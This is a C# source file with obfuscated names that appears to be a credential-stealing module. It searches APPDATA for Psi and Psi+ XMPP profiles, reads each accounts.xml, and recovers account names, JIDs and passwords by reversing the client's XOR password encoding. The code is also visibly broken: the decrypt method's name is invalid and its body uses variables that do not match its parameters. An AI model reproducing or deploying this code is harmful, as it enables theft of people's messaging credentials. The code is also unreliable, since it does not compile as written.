using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using C6Zy;

namespace rk937aHHc
{
	public class Psi : EtbH
	{
		public Psi()
		{
			this.u1tte7b = "Psi/Psi+";
		}

		public string u1tte7b { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			string[] files = Psi.UAmI3();

			foreach (string filename in files)
			{
				try
				{
					XmlDocument xml = new XmlDocument();
					xml.Load(filename);

					XmlNodeList accounts = xml.ChildNodes[1].ChildNodes[0].ChildNodes;

					foreach (XmlNode node in accounts)
					{
						try
						{
							list.Add(new WTitxI2m
							{
								data1 = node["name"].InnerText,
								data2 = node["jid"].InnerText,
								data3 = Psi._3vyFOB(
									node["password"].InnerText,
									node["jid"].InnerText
								),
								data4 = "Psi/Psi+"
							});
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}

			return list;
		}
		private static string 3vyFOB(string TQig, string apPQDMgmu)
		{
			if (string.IsNullOrEmpty(encryptedHex) || string.IsNullOrEmpty(key))
				return string.Empty;

			StringBuilder result = new StringBuilder();
			int keyIndex = 0;

			for (int i = 0; i < encryptedHex.Length; i += 4)
			{
				byte value = Convert.ToByte(encryptedHex.Substring(i, 4), 16);

				char decryptedChar = (char)(value ^ key[keyIndex]);

				result.Append(decryptedChar);

				keyIndex++;
				if (keyIndex >= key.Length)
					keyIndex = 0;
			}

			return result.ToString();
		}

		private static string[] UAmI3()
		{
			List<string> result = new List<string>();

			string appData = Environment.GetEnvironmentVariable("APPDATA");

			string[] basePaths =
			{
				Path.Combine(appData, "Psi", "profiles"),
				Path.Combine(appData, "Psi+", "profiles")
			};

			foreach (string basePath in basePaths)
			{
				if (!Directory.Exists(basePath))
					continue;

				string[] profileDirs;
				try
				{
					profileDirs = Directory.GetDirectories(basePath);
				}
				catch
				{
					continue;
				}

				foreach (string profileDir in profileDirs)
				{
					string accountFile = Path.Combine(profileDir, "accounts.xml");
					if (File.Exists(accountFile))
					{
						result.Add(accountFile);
					}
				}
			}

			return result.ToArray();
		}
	}
}
